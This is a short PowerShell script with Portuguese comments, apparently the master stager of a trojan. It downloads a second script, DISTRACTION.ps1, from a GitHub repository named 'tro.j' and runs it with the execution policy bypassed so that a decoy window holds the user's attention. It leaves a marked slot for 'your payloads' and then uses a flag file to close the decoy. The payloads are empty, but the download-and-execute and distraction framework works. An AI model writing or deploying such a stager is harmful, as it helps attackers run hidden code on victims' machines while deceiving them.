# ==============================================
# MASTER.ps1 - COM LOGS E JANELA VISÍVEL
# ==============================================

"$(Get-Date) - MASTER.ps1 iniciado" | Out-File "$env:TEMP\distraction_log.txt" -Append

# Baixa o DISTRACTION.ps1 para um arquivo local
$distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
$distractLocal = "$env:TEMP\distract.ps1"

try {
    (New-Object Net.WebClient).DownloadFile($distractScript, $distractLocal)
    "$(Get-Date) - DISTRACTION.ps1 baixado para $distractLocal" | Out-File "$env:TEMP\distraction_log.txt" -Append
} catch {
    "$(Get-Date) - ERRO ao baixar DISTRACTION.ps1: $_" | Out-File "$env:TEMP\distraction_log.txt" -Append
    exit 1
}

# Executa o DISTRACTION.ps1 em uma janela NORMAL (visível)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Normal -Exec Bypass -File `"$distractLocal`"" -WindowStyle Normal

"$(Get-Date) - DISTRACTION.ps1 iniciado em nova janela." | Out-File "$env:TEMP\distraction_log.txt" -Append

# Aguarda a distração abrir o formulário (5 segundos para garantir)
Start-Sleep -Seconds 5

# Seus payloads aqui...
Write-Host "Aguardando 10 segundos (payloads vazios)" -ForegroundColor Cyan
Start-Sleep -Seconds 10

# Cria a flag para destravar
New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null

"$(Get-Date) - Flag criada. Distração será encerrada." | Out-File "$env:TEMP\distraction_log.txt" -Append
Write-Host "Flag criada. Distração será encerrada." -ForegroundColor Green